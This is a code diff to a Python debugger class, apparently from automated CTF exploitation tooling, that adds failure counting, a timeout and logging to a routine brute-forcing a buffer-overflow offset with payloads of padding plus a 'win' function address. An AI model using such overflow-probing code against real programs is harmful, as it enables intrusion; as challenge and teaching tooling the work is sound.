@@ -119,13 +119,19 @@ class GdbDebugger:
         
         MAX_ITER = 20
         self.log(f"Binary search with win={hex(win_addr)} (max {MAX_ITER} tries)...")
+        consecutive_failures = 0
         for i, offset in enumerate(range(0x18, min(input_size, 0x200), 8)):
             if i >= MAX_ITER:
                 self.log(f"Reached max iterations ({MAX_ITER}), giving up")
                 return None
+            # Early abort: if we can't start the process at all, binary search is useless
+            if consecutive_failures >= 3:
+                self.log("Process keeps failing — aborting binary search")
+                return None
             payload = b'A' * offset + p64(win_addr)
             try:
-                p = process(self.binary_path)
+                p = process(self.binary_path, timeout=5)
+                consecutive_failures = 0
                 p.sendline(payload)
                 time.sleep(0.3)
                 try:
@@ -137,8 +143,10 @@ class GdbDebugger:
                 except:
                     pass
                 p.close()
-            except:
-                pass
+            except Exception as e:
+                consecutive_failures += 1
+                self.log(f"Process error (fail #{consecutive_failures}): {e}")
+                continue
         return None
     
     def detect_canary(self, base_offset):
